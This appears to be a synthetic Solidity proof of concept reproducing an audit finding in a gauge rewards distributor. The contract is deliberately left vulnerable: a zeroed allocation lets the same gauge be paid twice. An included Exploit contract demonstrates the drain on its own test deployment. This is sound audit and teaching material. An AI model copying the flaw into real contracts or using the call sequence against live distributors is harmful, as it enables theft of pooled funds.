// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Regnum Aurum — GaugeRewardsDistributor pays the same gauge twice (Pashov H-15)
    SYNTHETIC, cheatcode-free reduction. distributeRewards zeroes pendingAllocations,
    then the next call sees 0 and _recalculateAllocations runs again. Both blamed
    lines are verbatim. */

contract RewardToken {
    string public constant symbol = "RAAC";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BaseGauge {
    function notifyRewardAmount(address, uint256) external {}
}

contract GaugeRewardsDistributor {
    RewardToken public immutable reward;
    mapping(address => mapping(address => uint256)) public pendingAllocations;
    mapping(address => uint256) public distributionCycleBalance;
    mapping(address => bool) public distributionCycleActive;
    mapping(address => uint256) public currentCycleEnd;
    mapping(address => uint256) public activeCycleGaugeCount;
    mapping(address => address[]) public activeCycleGauges;
    address[] public registered;
    mapping(address => bool) public isGauge;

    constructor(RewardToken _reward) {
        reward = _reward;
    }

    function addGauge(address gauge) external {
        require(!isGauge[gauge], "gauge");
        isGauge[gauge] = true;
        registered.push(gauge);
    }

    function distributeRewards(address gauge, address token) external {
        _validateGaugeAndToken(gauge, token);
        if (!distributionCycleActive[token] || block.timestamp >= currentCycleEnd[token]) {
            _startDistributionCycle(token);
        }
        uint256 gaugeShare = _checkAndAddGaugeToCycle(token, gauge);
        _distributeRewardToGauge(gauge, token, gaugeShare);
    }

    function _validateGaugeAndToken(address gauge, address token) internal view {
        require(isGauge[gauge], "gauge");
        require(token == address(reward), "token");
    }

    function _startDistributionCycle(address token) internal {
        distributionCycleActive[token] = true;
        currentCycleEnd[token] = block.timestamp + 7 days;
        distributionCycleBalance[token] = RewardToken(token).balanceOf(address(this));
        for (uint256 i = 0; i < registered.length; i++) {
            activeCycleGauges[token].push(registered[i]);
        }
        activeCycleGaugeCount[token] = registered.length;
        _recalculateAllocations(token);
    }

    function _checkAndAddGaugeToCycle(address token, address gauge) internal returns (uint256) {
        uint256 gaugeShare = pendingAllocations[token][gauge];
        if (gaugeShare == 0 && distributionCycleBalance[token] > 0) { // @> VULN: a cleared claim is treated as a new gauge and allocated again. FIX: return 0 once the gauge was paid this cycle.
            bool gaugeInCycle = false;
            for (uint256 i = 0; i < activeCycleGaugeCount[token]; i++) {
                if (activeCycleGauges[token][i] == gauge) {
                    gaugeInCycle = true;
                    break;
                }
            }
            if (!gaugeInCycle && activeCycleGaugeCount[token] < activeCycleGauges[token].length) {
                activeCycleGauges[token][activeCycleGaugeCount[token]] = gauge;
                activeCycleGaugeCount[token]++;
            }
            _recalculateAllocations(token);
            gaugeShare = pendingAllocations[token][gauge];
        }
        return gaugeShare;
    }

    function _recalculateAllocations(address token) internal {
        uint256 count = activeCycleGaugeCount[token];
        if (count == 0) return;
        uint256 balance = RewardToken(token).balanceOf(address(this));
        uint256 share = balance / count;
        for (uint256 i = 0; i < count; i++) {
            pendingAllocations[token][activeCycleGauges[token][i]] = share;
        }
    }

    function _distributeRewardToGauge(address gauge, address token, uint256 gaugeShare) internal {
        if (gaugeShare > 0) {
            pendingAllocations[token][gauge] = 0; // @> VULN: zeroing the claim is what makes the next call take the branch above.
            RewardToken(token).transfer(gauge, gaugeShare);
            BaseGauge(gauge).notifyRewardAmount(token, gaugeShare);
        }
    }
}

contract Exploit {
    RewardToken public token; // nonce 1
    BaseGauge public gaugeA; // nonce 2
    BaseGauge public gaugeB; // nonce 3
    GaugeRewardsDistributor public distributor; // nonce 4

    constructor() {
        token = new RewardToken();
        gaugeA = new BaseGauge();
        gaugeB = new BaseGauge();
        distributor = new GaugeRewardsDistributor(token);
    }

    function run() external {
        token.mint(address(distributor), 100 ether);
        distributor.addGauge(address(gaugeA));
        distributor.addGauge(address(gaugeB));
        // First call starts the cycle, splits 100 into 50/50, and pays A its 50.
        distributor.distributeRewards(address(gaugeA), address(token));
        // Second call sees pending A == 0 and recalculates the remaining 50, paying A another 25.
        distributor.distributeRewards(address(gaugeA), address(token));
        distributor.distributeRewards(address(gaugeB), address(token));
        require(token.balanceOf(address(gaugeA)) == 75 ether, "A got 75");
        require(token.balanceOf(address(gaugeB)) == 25 ether, "B left 25");
        require(distributor.pendingAllocations(address(token), address(gaugeA)) == 0, "A cleared");
    }
}
